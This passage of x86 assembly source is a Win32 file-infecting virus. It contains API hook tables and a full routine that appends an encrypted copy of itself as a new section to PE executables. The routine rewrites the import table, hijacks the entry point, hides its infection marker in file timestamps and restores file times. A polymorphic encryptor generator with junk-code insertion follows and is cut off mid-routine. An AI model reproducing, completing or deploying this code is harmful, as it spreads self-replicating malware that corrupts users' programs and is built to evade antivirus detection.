		Dd	Offset NFindFirstFileA
		Dd	Offset IFindFirstFileA

		Dd	Offset _FindNextFileA
		Dd	Offset NFindNextFileA
		Dd	Offset IFindNextFileA

KrnlImpCnt	=	($ - Offset KrnlImp)/(3*4)
;BreakCodeLine

;DefCodeLine
ShellImp	Label	DWord
		Dd	Offset _ShellExecuteA
		Dd	Offset NShellExecuteA
		Dd	Offset IShellExecuteA

		Dd	Offset _ShellExecuteEx
		Dd	Offset NShellExecuteEx
		Dd	Offset IShellExecuteEx

		Dd	Offset _ShellExecuteExA
		Dd	Offset NShellExecuteExA
		Dd	Offset IShellExecuteExA

		Dd	Offset _FindExecutableA
		Dd	Offset NFindExecutableA
		Dd	Offset IFindExecutableA

ShellImpCnt	=	($ - Offset ShellImp)/(3*4)
;BreakCodeLine

;DefCodeLine
DialogImp	Label	DWord
		Dd	Offset _GetOpenFileNameA
		Dd	Offset NGetOpenFileNameA
		Dd	Offset IGetOpenFileNameA

		Dd	Offset _GetSaveFileNameA
		Dd	Offset NGetSaveFileNameA
		Dd	Offset IGetSaveFileNameA

DialogImpCnt	=	($ - Offset DialogImp)/(3*4)
;BreakCodeLine

;DefCodeLine
UserImp		Label	DWord
		Dd	Offset _DrawTextA
		Dd	Offset NDrawTextA
		Dd	Offset IDrawTextA

		Dd	Offset _DrawTextExA
		Dd	Offset NDrawTextExA
		Dd	Offset IDrawTextExA

		Dd	Offset _TabbedTextOutA
		Dd	Offset NTabbedTextOutA
		Dd	Offset ITabbedTextOutA

		Dd	Offset _wsprintfA
		Dd	Offset NwsprintfA
		Dd	Offset IwsprintfA

		Dd	Offset _wvsprintfA
		Dd	Offset NwvsprintfA
		Dd	Offset IwvsprintfA

		Dd	Offset _GetTabbedTextExtentA
		Dd	Offset NGetTabbedTextExtentA
		Dd	Offset IGetTabbedTextExtentA

		Dd	Offset _MessageBoxA
		Dd	Offset NMessageBoxA
		Dd	Offset IMessageBoxA

		Dd	Offset _WinHelpA
		Dd	Offset NWinHelpA
		Dd	Offset IWinHelpA

UserImpCnt	=	($ - Offset UserImp)/(3*4)
;BreakCodeLine

;DefCodeLine
GDIImp		Label	DWord
		Dd	Offset _TextOutA
		Dd	Offset NTextoutA
		Dd	Offset ITextOutA

		Dd	Offset _ExtTextOutA
		Dd	Offset NExtTextOutA
		Dd	Offset IExtTextOutA

		Dd	Offset _GetTextExtentPointA
		Dd	Offset NGetTextExtentPointA
		Dd	Offset IGetTextExtentPointA

		Dd	Offset _GetTextExtentPoint32A
		Dd	Offset NGetTextExtentPoint32A
		Dd	Offset IGetTextExtentPoint32A

		Dd	Offset _GetTextExtentExPointA
		Dd	Offset NGetTextExtentExPointA
		Dd	Offset IGetTextExtentExPointA

GDIImpCnt	=	($ - Offset GDIImp)/(3*4)
;BreakCodeLine

;Separator=_Jmp
; ---------------------------------------------------------
; Infector routines
InfectByName:	Push	MemCommitSz/4h
		Call	AllocStackMem		; Infect file by name in EDx
		Cmp	Debug,0h		; (Who in EBx)
		Je	Infect_0$
		Or	EDx,EDx
		Jne	Infect_D$
		Push	30h			; OkOnly+Exclamation
		Push	EBx
		Push	Offset InfNoNameMsg
		Push	0h
		Call	MessageBoxA		; [!!!For DEBUG!!!]
		Push	MemCommitSz/4h
		Call	FreeStackMem
		Ret

Infect_D$:	Push	EBx
		Push	EDx
		Push	21h			; OkCancel+Question
		Push	EBx
		Push	EDx
		Push	0h
		Call	MessageBoxA		; [!!!For DEBUG!!!]
		Pop	EDx
		Cmp	EAx,1h
		Pop	EBx
		Jz	Infect_0$
		Push	30h			; OkOnly+Exclamation
		Push	EBx			; Infecting disabled
		Push	Offset InfCancelMsg	; by Creator
		Push	0h
		Call	MessageBoxA
		Push	MemCommitSz/4h
		Call	FreeStackMem
		Ret

Infect_0$:	Mov	FileNamePtr,EDx		; !!!Ready and Waiting!!!
		Push	EDx
		Call	GetFileAttributesA	; Get file attributes
		Or	EAx,EAx
		Jz	Infect_F0$
		Mov	FileAttributes,EAx
		Push	80h			; File_Attribute_Normal
		Push	DWord Ptr FileNamePtr
		Call	SetFileAttributesA
		Push	0h
		Push	10000000h+80h		; FAN, FFRA
		Push	3h			; OE
		Push	0h
		Push	1h			; FSR
		Push	80000000h+40000000h	; GR/GW
		Push	DWord Ptr FileNamePtr
		Call	CreateFileA		; Try to open
		Cmp	EAx,-1
		Je	Infect_F1$
		Mov	FileHandle,EAx
		Lea	EAx,FileLastWrite	; Storing file Date/Time
		Push	EAx			; for future restoring
		Lea	EAx,FileLastAccess
		Push	EAx
		Lea	EAx,FileCreation
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	GetFileTime

		Lea	EAx,FT_Struc		; Checking infection flag
		Push	EAx
		Lea	EAx,FileLastWrite
		Push	EAx
		Call	FileTimeToSystemTime
		Mov	Ax,FT_Year
		Rol	Ax,1
		Xor	Ax,FT_Month
		Ror	Ax,1
		Xor	Ax,FT_Day
		Rol	Ax,1
		Xor	Ax,FT_Hour
		Ror	Ax,1
		Xor	Ax,FT_Minute
		Rol	Ax,1
		And	Ax,3Ch
		Cmp	Ax,FT_Second		; Already! Good.
		Je	Infect_F2$
		Mov	NewSeconds,Ax

		Push	0h
		Lea	EAx,ProcessedBytes	; Read the DOS file
		Push	EAx			; header
		Push	40h
		Lea	EAx,DosHeader
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	ReadFile
		Or	EAx,EAx			; Error reading
		Jz	Infect_F2$
		Cmp	DWord Ptr ProcessedBytes,40h
		Jne	Infect_F2$		; Readed less then 40h bytes
		Cmp	Word Ptr DosHeader,'MZ'
		Je	Infect_F3$
		Cmp	Word Ptr DosHeader,'ZM'
		Jne	Infect_F2$
Infect_F3$:	Cmp	Word Ptr DosHeader[18h],40h
		Jb	Infect_F2$
		Push	0h			; FileBegin
		Push	0h
		Push	DWord Ptr DosHeader[3Ch]
		Push	DWord Ptr FileHandle	; Seek to PE Header start
		Call	SetFilePointer
		Cmp	EAx,-1
		Je	Infect_F2$
		Push	0h			; Read the PEHeader
		Lea	EAx,ProcessedBytes
		Push	EAx
		Push	PEHeaderSize
		Lea	EAx,PEHeader
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	ReadFile
		Or	EAx,EAx
		Jz	Infect_F2$		; Error reading
		Cmp	DWord Ptr ProcessedBytes,PEHeaderSize
		Jne	Infect_F2$		; Readed too less bytes
		Cmp	DWord Ptr PE_Sign,'EP'
		Jne	Infect_F2$

		MovZx	EAx,Word Ptr PE_NTHdrSize
		Add	EAx,DWord Ptr DosHeader[3Ch]
		Add	EAx,18h
		Mov	PEFileHeaders,EAx
		Push	0h			; Seek to sections descr.
		Push	0h
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Cmp	EAx,-1			; Error seeking
		Je	Infect_F2$
		MovZx	ECx,Word Ptr PE_NumOfSections
		Or	ECx,ECx			; No sections
		Jz	Infect_F2$
		Mov	EAx,SectSize
		Mul	ECx
		Add	EAx,PEFileHeaders
		Add	EAx,SectSize
		Cmp	EAx,PE_HeaderSize	; No room for new section!?
		Ja	Infect_F2$

		Mov	DWord Ptr ImportLegal,0h
		Xor	EDx,EDx
		MovZx	ECx,Word Ptr PE_NumOfSections
Infect_AS$:	Inc	EDx
		Push	ECx
		Push	EDx
		Push	0h			; Read the section header
		Lea	EAx,ProcessedBytes
		Push	EAx
		Push	SectSize
		Lea	EAx,Section
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	ReadFile
		Pop	EDx
		Pop	ECx
		Or	EAx,EAx			; Error reading
		Jz	Infect_F2$
		Cmp	DWord Ptr ProcessedBytes,SectSize
		Jne	Infect_F2$		; Readed too less bytes
		Cmp	DWord Ptr ImportLegal,0h
		Jne	Infect_NS$		; Import already detected!
		Mov	EAx,SectRVA
		Cmp	EAx,PE_ImportTableRVA
		Ja	Infect_NS$
		Mov	ImportRVA,EAx
		Add	EAx,SectVirtSize
		Cmp	EAx,PE_ImportTableRVA
		Jbe	Infect_NS$
		Mov	EAx,SectPhysOffs
		Mov	ImportPhysOffs,EAx
		Mov	EAx,SectFlags
		Mov	ImportFlags,EAx
		Mov	ImportOrder,EDx
		Mov	DWord Ptr ImportLegal,-1
Infect_NS$:	Dec	ECx
		Jnz	Infect_AS$
		Cmp	DWord Ptr ImportLegal,0h
		Jz	Infect_F2$		; Import not found ?!

		Mov	EAx,DWord Ptr SelfSectionName
		Mov	SelfSectName,EAx	; SetUp self section name
		Mov	EAx,DWord Ptr SelfSectionName+4
		Mov	SelfSectName+4,EAx
		Mov	EAx,SectRVA
		Add	EAx,SectVirtSize
		Mov	EBx,PE_ObjectAlign
		Call	AlignDWordOnDWord
		Mov	SelfSectRVA,EAx		; SetUp self sect. RVA & Flags
		Mov	DWord Ptr SelfSectFlags,0E0000040h	; R/W/E, IData

		Push	2h			; Seek to EOF
		Push	0h
		Push	0h
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Cmp	EAx,-1
		Je	Infect_F2$
		Push	EAx			; SetUp self section
		Mov	EBx,PE_FileAlign	; Physical Offset
		Call	AlignDWordOnDWord
		Mov	SelfSectPhysOffs,EAx
		Pop	EBx
		Sub	EAx,EBx
		Jz	Infect_NoPreA$
		Push	EAx			; Need file alignment
		Mov	ECx,EAx
		Lea	EDi,VeryLargeBuffer
		Cld
		Xor	Al,Al
		Rep	StosB
		Pop	ECx
		Push	ECx
		Push	0h
		Lea	EAx,ProcessedBytes	; Write some null's into
		Push	EAx			; fucking file
		Push	ECx
		Lea	EAx,VeryLargeBuffer
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Or	EAx,EAx
		Pop	ECx
		Jz	Infect_F2$
		Cmp	ECx,ProcessedBytes
		Jne	Infect_F2$

Infect_NoPreA$:	Xor	EBx,EBx
		Lea	EDi,VeryLargeBuffer	; Transfer self to memory
		Mov	ESi,Offset Start
Infect_Trans$:	Mov	Al,[ESi][EBx]
		Mov	[EDi][EBx],Al
		Inc	EBx
		Cmp	EBx,StubImportPlace
		Jb	Infect_Trans$

		Mov	EAx,9h			; Generate the set of
		Call	Random			; polymorphic cryptors
		Add	EAx,8h			; in range (8..16)
		Mov	CryptCnt,EAx
		Lea	EAx,VeryLargeBuffer
		Add	EAx,StubImportPlace
		Mov	EDi,EAx
		Mov	EAx,FixUpsCounter	; Depend on PELINK
		Shl	EAx,2h			; tool linking strategy!
		Add	EAx,FixUpsPlace
		Mov	GenCrSz,EAx
		Xor	EAx,EAx
		Mov	GenSz,EAx
		Mov	GenTotalSz,EAx
Infect_Gen$:	Add	EDi,1000h		; Maximal encryptor size!
Infect_Gen_A$:	Lea	ESi,[EDi-1000h]
		Mov	ECx,GenCrSz
		Push	EDi
		Push	EAx			; Make the cryptor pairs
		Call	GenPolyMorph
		Pop	EAx
		Pop	EDi
		Cmp	EBx,1000h
		Ja	Infect_Gen_A$
		Mov	Cryptors[EAx*8],EBx	; Encryptor size
		Mov	Cryptors[EAx*8+4],EDx	; Decryptor size
		Add	GenSz,EDx
		Add	GenCrSz,EDx
		Add	GenTotalSz,EDx
		Add	GenTotalSz,EBx
		Xchg	ESi,EDi
		Mov	ECx,EDx
		Cld				; Pack cryptors
		Rep	MovsB
		Inc	EAx
		Cmp	EAx,CryptCnt
		Jb	Infect_Gen$

		Lea	EDi,VeryLargeBuffer
		Mov	EBx,Here
		Mov	ESi,FixUpsPlace
		Mov	ECx,FixUpsCounter	; UnDo FixUps
Infect_UnDo1$:	Mov	EAx,[ESi][EBx]
		Sub	[EDi][EAx],EBx
		Add	ESi,4h
		Dec	ECx
		Jnz	Infect_UnDo1$

		Mov	EAx,GenSz		; SetUp PolyMorph sizes
		Mov	EDx,Offset PolyMorphSz
		Sub	EDx,EBx
		Mov	[EDi][EDx],EAx
		Mov	EAx,PE_EntryPointRVA	; SetUp EntryPoint
		Mov	EDx,Offset StubEntryLabel
		Sub	EDx,EBx
		Mov	[EDi][EDx],EAx
		Mov	EAx,SelfSectRVA		; SetUp SelfPlace
		Mov	EDx,Offset CurrentPlace
		Sub	EDx,EBx
		Mov	[EDi][EDx],EAx
		Mov	EAx,PE_ImageBase	; SetUp ImagePlace
		Mov	EDx,Offset ImagePlace
		Sub	EDx,EBx
		Mov	[EDi][EDx],EAx
		Mov	EAx,1h			; SetUp Initialization Flag
		Mov	EDx,Offset InitOk
		Sub	EDx,EBx
		Mov	[EDi][EDx],EAx

		Mov	ESi,ImportPlace		; ReSetUp Import directory
		Mov	ECx,ImportLength
Infect_UnDo2$:	Mov	EDx,[ESi][EBx]		; Get LookUp pointer
		Sub	EDx,CurrentPlace
		Sub	EDx,PolyMorphSz
		Push	EDx
Infect_Un_2$:	Mov	EAx,[EDx][EBx]		; ReSetUp LookUp table
		Or	EAx,EAx
		Jz	Infect_Un_1$
		Sub	EAx,CurrentPlace
		Sub	EAx,PolyMorphSz
		Add	EAx,SelfSectRVA
		Add	EAx,GenSz
		Mov	[EDi][EDx],EAx
		Add	EDx,4h
		Jmp	Infect_Un_2$
Infect_Un_1$:	Pop	EDx
		Add	EDx,SelfSectRVA		; ReSetUp LookUp ptr
		Add	EDx,GenSz
		Mov	[EDi][ESi],EDx
		Mov	EDx,[ESi][EBx]+3*4	; ReSetUp Name ptr
		Sub	EDx,CurrentPlace
		Sub	EDx,PolyMorphSz
		Add	EDx,SelfSectRVA
		Add	EDx,GenSz
		Mov	[EDi][ESi]+3*4,EDx
		Mov	EDx,[ESi][EBx]+4*4	; ReSetUp ImprtAddress ptr
		Sub	EDx,CurrentPlace
		Sub	EDx,PolyMorphSz
		Add	EDx,SelfSectRVA
		Add	EDx,GenSz
		Mov	[EDi][ESi]+4*4,EDx
		Add	ESi,5*4
		Sub	ECx,5*4
		Ja	Infect_UnDo2$

		Lea	ESi,VeryLargeBuffer	; Crypt the self body
		Mov	ECx,StubImportPlace	; before writing it
		Add	ECx,GenTotalSz		; into desired file
		Add	ESi,ECx
		Mov	EDi,ESi
		Add	EDi,GenSz
		Dec	EDi
		Dec	ESi
		Std				; Place buffer at
		Rep	MovsB			; program start
		Mov	ESi,StubImportPlace
		Add	ESi,EDi
		Xor	EAx,EAx
Infect_Crypt$:	Push	EAx
		Mov	ECx,Cryptors[EAx*8+4]
		Lea	EBx,[ESi+1]
		Add	ESi,ECx
		Add	ESi,Cryptors[EAx*8]
		Push	ESi
		Push	EDi
		Std
		Rep	MovsB
		Xchg	EDi,[ESp]
		Inc	EDi
		Push	EBp
		Push	EDi
		Call	EBx			; Crypt by one cryptor
		Pop	EBp
		Pop	EDi
		Pop	ESi
		Pop	EAx
		Inc	EAx
		Cmp	EAx,CryptCnt
		Jb	Infect_Crypt$
		Cld

		Mov	ECx,StubImportPlace
		Add	ECx,GenSz
		Push	ECx
		Push	0h			; WRITE self body
		Lea	EAx,ProcessedBytes	; File pointer
		Push	EAx			; must be at file EOF
		Push	ECx
		Lea	EAx,VeryLargeBuffer
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Or	EAx,EAx			; Error writing
		Pop	EAx
		Jz	Infect_F2$
		Cmp	EAx,ProcessedBytes
		Jne	Infect_F2$		; Too less bytes written

		Mov	EAx,PE_ImportTableRVA	; Calculate import place
		Sub	EAx,ImportRVA		; in file
		Add	EAx,ImportPhysOffs
		Push	0h
		Push	0h
		Push	EAx
		Push	DWord Ptr FileHandle	; And seek in file at
		Call	SetFilePointer		; this position
		Cmp	EAx,-1
		Je	Infect_F2$		; Error seeking
		Lea	EBx,VeryLargeBuffer
Infect_Trans1$:	Push	EBx
		Push	0h
		Lea	EAx,ProcessedBytes	; Read the next import record
		Push	EAx
		Push	5*4
		Push	EBx
		Push	DWord Ptr FileHandle
		Call	ReadFile
		Pop	EBx
		Or	EAx,EAx
		Jz	Infect_F2$		; Errors. . .
		Cmp	DWord Ptr ProcessedBytes,5*4
		Jne	Infect_F2$
		Add	EBx,5*4			; Last import record???
		Cmp	DWord Ptr [EBx][3*4][-5*4],0h
		Jne	Infect_Trans1$
		Lea	EAx,VeryLargeBuffer
		Sub	EBx,EAx
		Push	EBx
		Push	2h			; Seek to EOF
		Push	0h
		Push	0h
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Pop	EBx
		Cmp	EAx,-1			; Errors. . .
		Je	Infect_F2$
		Push	EBx
		Push	0h			; Write all import records
		Lea	EAx,ProcessedBytes	; to target file
		Push	EAx
		Push	EBx
		Lea	EAx,VeryLargeBuffer
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Pop	EBx
		Or	EAx,EAx			; Errors. . .
		Jz	Infect_F2$
		Cmp	ProcessedBytes,EBx
		Jne	Infect_F2$
		Add	EBx,ImportLength	; Calculate the new import
		Mov	PE_ImportDataSz,EBx	; size and RVA
		Mov	EAx,SelfSectRVA
		Add	EAx,GenSz
		Add	EAx,ImportPlace
		Mov	PE_ImportTableRVA,EAx

		Lea	EDi,VeryLargeBuffer	; Generate some random trash
		Mov	EAx,100h
		Call	Random
		Lea	ECx,[EAx+10h]
		Push	ECx
		Cld
Infect_Trash$:	Mov	EAx,100h
		Call	Random
		StosB
		Dec	ECx
		Jnz	Infect_Trash$
		Mov	ECx,[ESp]
		Push	0h			; and write it into
		Lea	EAx,ProcessedBytes	; fucking file, at them
		Push	EAx			; end
		Push	ECx
		Lea	EAx,VeryLargeBuffer
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Or	EAx,EAx			; Error writing!
		Pop	EAx
		Jz	Infect_F2$
		Cmp	EAx,ProcessedBytes	; Too less bytes written
		Jne	Infect_F2$

		Push	2h			; Seek to EOF
		Push	0h
		Push	0h
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Cmp	EAx,-1			; Seeking failure
		Je	Infect_F2$
		Sub	EAx,SelfSectPhysOffs	; SetUp self section sizes
		Mov	SelfSectVirtSize,EAx
		Mov	EBx,PE_FileAlign
		Call	AlignDWordOnDWord
		Mov	SelfSectPhysSize,EAx
		Sub	EAx,SelfSectVirtSize
		Jz	Infect_ToDone$		; Need file align?
		Mov	ECx,EAx
		Push	ECx
		Mov	Al,0h			; Prepare aligning buffer
		Cld
		Lea	EDi,VeryLargeBuffer
		Rep	StosB
		Pop	ECx
		Push	ECx			; And align the file
		Push	0h
		Lea	EAx,ProcessedBytes
		Push	EAx
		Push	ECx
		Lea	EAx,VeryLargeBuffer
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Pop	ECx
		Or	EAx,EAx			; Error writing!
		Jz	Infect_F2$
		Cmp	DWord Ptr ProcessedBytes,ECx
		Jne	Infect_F2$		; Too less bytes written

Infect_ToDone$:	Mov	EAx,SelfSectVirtSize	; SetUp memory requirement
		Mov	EBx,PE_ObjectAlign
		Call	AlignDWordOnDWord
		Add	PE_ImageSize,EAx
		Add	PE_SizeOfIData,EAx
		Mov	EAx,SelfSectRVA		; SetUp Self EntryPoint
		Mov	PE_EntryPointRVA,EAx
		Mov	EAx,PE_StackReserveSz	; SetUp stack size
		Add	EAx,MemCommitSz		; (for placing temporary
		Mov	PE_StackReserveSz,EAx	; buffer)

		MovZx	EAx,Word Ptr PE_NumOfSections
		Mov	ECx,SectSize
		Mul	ECx
		Add	EAx,PEFileHeaders
		Push	0h			; Prepare to write
		Push	0h			; SelfSection descriptor
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Cmp	EAx,-1			; Errors. . .
		Je	Infect_F2$
		Push	0h			; And write it!
		Lea	EAx,ProcessedBytes
		Push	EAx
		Push	SelfSectSize
		Lea	EAx,SelfSection
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Or	EAx,EAx
		Jz	Infect_F2$		; Errors. . .
		Cmp	DWord Ptr ProcessedBytes,SelfSectSize
		Jne	Infect_F2$

		Mov	ECx,DWord Ptr ImportOrder
		Mov	EAx,SectSize		; Prepare to write import
		Mul	ECx			; section flags
		Add	EAx,PEFileHeaders	; Warning!!!
		Sub	EAx,4h			; Import section Flags
		Push	0h			; is the LAST field in
		Push	0h			; section header structure
		Push	EAx			; !!!!!!!!!!!!!!!!!!!!!!!!
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Cmp	EAx,-1h			; Seeking failure
		Je	Infect_F2$

		Or	DWord Ptr ImportFlags,0C0000000h
		Push	0h			; Enable reading
		Lea	EAx,ProcessedBytes	; and writing
		Push	EAx			; in Import section
		Push	4h
		Lea	EAx,ImportFlags
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Or	EAx,EAx
		Jz	Infect_F2$		; Errors. . .
		Cmp	DWord Ptr ProcessedBytes,4h
		Jne	Infect_F2$

		Inc	Word Ptr PE_NumOfSections	; New # of sections
		Push	0h			; Prepare to writing
		Push	0h			; PE header
		Push	DWord Ptr DosHeader[3Ch]
		Push	DWord Ptr FileHandle
		Call	SetFilePointer
		Cmp	EAx,-1
		Je	Infect_F2$
		Push	0h
		Lea	EAx,ProcessedBytes
		Push	EAx
		Push	PEHeaderSize		; And write it
		Lea	EAx,PEHeader
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	WriteFile
		Or	EAx,EAx
		Jz	Infect_F2$		; Errors. . .
		Cmp	DWord Ptr ProcessedBytes,PEHeaderSize
		Jne	Infect_F2$

		Mov	Ax,NewSeconds		; Ok! Set infection flag.
		Mov	FT_Second,Ax
		Lea	EAx,FileLastWrite
		Push	EAx
		Lea	EAx,FT_Struc
		Push	EAx
		Call	SystemTimeToFileTime

Infect_F2$:	Lea	EAx,FileLastWrite	; Restore file Date/Time
		Push	EAx
		Lea	EAx,FileLastAccess
		Push	EAx
		Lea	EAx,FileCreation
		Push	EAx
		Push	DWord Ptr FileHandle
		Call	SetFileTime

		Push	DWord Ptr FileHandle	; Close our file. Ooh, Yes!
		Call	CloseHandle

Infect_F1$:	Push	DWord Ptr FileAttributes; Restore file attributes
		Push	DWord Ptr FileNamePtr
		Call	SetFileAttributesA
Infect_F0$:	Push	MemCommitSz/4h
		Call	FreeStackMem
		Ret

; ---------------------------------------------------------
; Service routines
;
AllocStackMem:	Pop	EAx			; Allocate memory in Stack
		Pop	ECx			; Corrupt EAx,ECx !!!
		Push	EBp			; Do not use call stack
AllocStack_1$:	Push	0h			; before this call
		Dec	ECx
		Jnz	AllocStack_1$
		Mov	EBp,ESp
		Push	EAx
		Ret

FreeStackMem:	Pop	EAx			; Free memory in Stack
		Pop	ECx			; Corrupt EAx,ECx !!!
FreeStack_1$:	Pop	DropDWord		; Do not use stack
		Dec	ECx			; memory after this call
		Jnz	FreeStack_1$
		Pop	EBp
		Push	EAx
		Ret
DropDWord	Dd	?

AlignDWordOnDWord:
		Push	EDx
		Xor	EDx,EDx			; Align EAx by EBx boundary
		Push	EAx
		Div	EBx
		Pop	EAx
		Or	EDx,EDx
		Jz	AlignDWord_0$
		Sub	EAx,EDx
		Add	EAx,EBx
AlignDWord_0$:	Pop	EDx
		Ret

; ---------------------------------------------------------
; My string converter ;-)
ConvertStr:	Cld				; Convert some string
		Call	InitConverter		; in EDx with
		Mov	ESi,EDx			; possibly length in ECx
		Lea	EDi,SmallBuffer		; (Corrupt EDi,ESi,EAx)
		Push	ESi
		Push	EDi
		Push	ECx
		Push	EBx
		Cmp	ECx,-1h
		Je	Convert_Mode1$

		Or	ECx,ECx
		Jz	Convert_Done$
Convert_Mode0$:	Call	ProcessChar		; Counter mode
		Dec	ECx
		Jnz	Convert_Mode0$
		Pop	EBx
		Pop	ECx
		Pop	EDx
		Pop	ECx
		Mov	Byte Ptr Es:[EDi],0h
		Sub	EDi,EDx
		Mov	ECx,EDi
		Ret

Convert_Mode1$:	Call	ProcessChar		; ASCIZ mode
		Cmp	Byte Ptr [ESi][-1],0h
		Jne	Convert_Mode1$
		Pop	EBx
		Pop	ECx
		Pop	EDx
		Pop	EAx
		Ret

Convert_Done$:	Pop	EBx
		Pop	ECx
		Pop	EDi
		Pop	ESi
		Mov	Byte Ptr Es:[EDi],0h
		Ret

ProcessChar:	LodsB				; Process one char, empty
		StosB				; strings are not allowed!!!
		Cmp	Al,'a'
		Jb	Process_1$		; UpCase the source char
		Cmp	Al,'z'
		Ja	Process_1$
		Sub	Al,20h
Process_1$:	Push	ECx
		Push	EBx
		Push	EDx
		Mov	ECx,ConvertDataLen
		Xor	EBx,EBx			; Try the some variants
Process_Again$:	Mov	EDx,[EBx*4]ConvertVar
		Mov	Ah,[EDx]
		Inc	DWord Ptr [EBx*4]ConvertVar
		Cmp	Al,Ah			; Good char?
		Jne	Process_Bad$
		Cmp	Byte Ptr [EDx][1],0h	; Last char in variant?
		Jne	Process_Next$

		Sub	EDx,[EBx*8][ConvertData]
		Sub	EDi,EDx			; Make the replacing
		Dec	EDi
		Push	ESi
		Mov	ESi,[EBx*8+4][ConvertData]
Process_Do$:	LodsB				; Transfer the real string
		StosB				; converted by me ;-)
		Cmp	Al,0h
		Jne	Process_Do$
		Dec	EDi
		Pop	ESi
		Push	DWord Ptr [EBx*8][ConvertData]
		Pop	DWord Ptr [EBx*4]ConvertVar
		Jmp	Process_Ok$

Process_Bad$:	Push	DWord Ptr [EBx*8][ConvertData]
		Pop	DWord Ptr [EBx*4]ConvertVar
Process_Next$:	Inc	EBx			; Next variant
		Dec	ECx
		Jnz	Process_Again$
Process_Ok$:	Pop	EDx			; Char has been processed
		Pop	EBx
		Pop	ECx
		Ret

InitConverter:	Push	EBx			; InitConverter routines
		Push	ECx
		Mov	ECx,ConvertDataLen
		Xor	EBx,EBx
InitConv_1$:	Push	DWord Ptr [EBx*8][ConvertData]
		Pop	DWord Ptr [EBx*4]ConvertVar
		Inc	EBx
		Dec	ECx
		Jnz	InitConv_1$
		Pop	ECx
		Pop	EBx
		Ret

Transfer_Str:	Cmp	ECx,-1h			; More strict strings
		Je	Transfer_S_M$		; moving routine
		Or	ECx,ECx
		Jz	Transfer_S_D$
		Rep	MovsB
Transfer_S_D$:	Xor	Al,Al
		StosB
		Ret

Transfer_S_M$:	LodsB
		StosB
		Or	Al,Al
		Jnz	Transfer_S_M$
		Ret

; ---------------------------------------------------------
; The PolyMorph code has the such structure:
;           PushA
;           Call   Start
;           ...
; Sem:      Dd     1h
;           ...
; Start:    Pop    BaseReg
;           Xor    SemReg,SemReg (And SemReg,0) (Mov SemReg,0)
; LockSem:  Xchg   [BaseReg][Sem],SemReg
;           Or     SemReg,SemReg (Test SemReg,SemReg) (And SemReg,SemReg)
;           Jz     LockSem
;           Cmp    SemReg,2h
;           Je     Done
;           Add    BaseReg,CodeStart
;           Add    [BaseReg][Border],BaseReg
;           .LoadRegisters
; Again:    .Decrypt
;           Add    Base,4h (Inc Base) 4 times
;           Cmp    Base,Border
;           Jb     Again
;           Sub    BaseReg,CodeStart+CodeSize
; Done:     Mov    [BaseReg][Sem],2h
;           PopA
; CodeStart:
;
; All code mixed with trash. . .               Prepare to understand!

GenPolyMorph:	Push	ESi
		Push	EDi
		Push	ECx
		Call	GetNoESpReg		; Choose the 2 base
		Mov	pBaseReg,Al		; registers
		Mov	Bl,Al			; Base
GenPolyM_R$:	Call	GetNoESpReg
		Cmp	Bl,Al
		Je	GenPolyM_R$
		Mov	pSemReg,Al		; and Semaphore
		Mov	Byte Ptr pEnableEncr,0h
		Mov	ECx,5h
		Mov	EBx,Offset GenNoRegCom
		Call	Enumer
		Mov	Al,60h			; PushA
		StosB
		Mov	Ax,-1h
		Mov	EBx,Offset GenAnyCom
		Call	Enumer
		Mov	Al,0E8h			; Call $+...
		StosB
		Mov	EAx,50h
		Call	Random
		Add	EAx,10h
		Push	EAx
		StosD
		Mov	pBase,EDi
		Mov	ECx,EAx
GenPolyM_C$:	Mov	EAx,100h
		Call	Random
		StosB
		Dec	ECx
		Jnz	GenPolyM_C$
		Pop	EAx
		Sub	EAx,4h
		Call	Random
		Mov	pSem,EAx
		Add	EAx,pBase		; SetUp semaphore
		Mov	DWord Ptr [EAx],1h
		Mov	Al,pBaseReg		; Pop BaseReg
		Or	Al,58h
		StosB
		Mov	Ah,-1h
		Mov	Al,pBaseReg
		Mov	ECx,5h
		Mov	EBx,Offset GenAnyCom
		Call	Enumer
		Mov	EAx,2h			; Xor SemReg,SemReg
		Call	Random
		Or	Al,Al
		Jz	GenPolyM_X$
		Mov	Al,2h
		Call	Random
		Or	Al,Al
		Jz	GenPolyM_XM$
		Mov	Al,81h			; (And)
		StosB
		Mov	Al,pSemReg
		Or	Al,0E0h
		StosB
		Xor	EAx,EAx
		StosD
		Jmp	GenPolyM_XD$
GenPolyM_XM$:	Mov	Al,0B8h			; (Mov)
		Or	Al,pSemReg
		StosB
		Xor	EAx,EAx
		StosD
		Jmp	GenPolyM_XD$
GenPolyM_X$:	Mov	Al,2h			; (Xor)
		Call	Random
		Add	EAx,EAx
		Or	Al,31h
		StosB
		Mov	Al,pSemReg
		Shl	Al,3h
		Or	Al,pSemReg
		Or	Al,0C0h
		StosB
GenPolyM_XD$:	Mov	Al,pSemReg
		Mov	Ah,pBaseReg
		Call	Enumer
		Mov	pXchg,EDi
		Mov	Al,87h			; Xchg SemReg,[BaseReg][Sem]
		StosB
		Mov	Al,pSemReg
		Shl	Al,3h
		Or	Al,80h
		Or	Al,pBaseReg
		StosB
		Mov	EAx,pSem
		StosD
		Mov	Al,pBaseReg
		Mov	Ah,pSemReg
		Call	Enumer
		Mov	EAx,4h			; Or SemReg,SemReg
		Call	Random
		Jz	GenPolyM_OC$
		Mov	Al,3h			; (And) (Test) (Or)
		Call	Random
		Shl	Al,3h
		Mov	Cl,Al
		Mov	EAx,092185h
		Shr	EAx,Cl
		Cmp	Al,85h
		Je	GenPolyM_O$
		Push	EAx
		Mov	EAx,2h
		Call	Random
		Or	Al,Al
		Pop	EAx
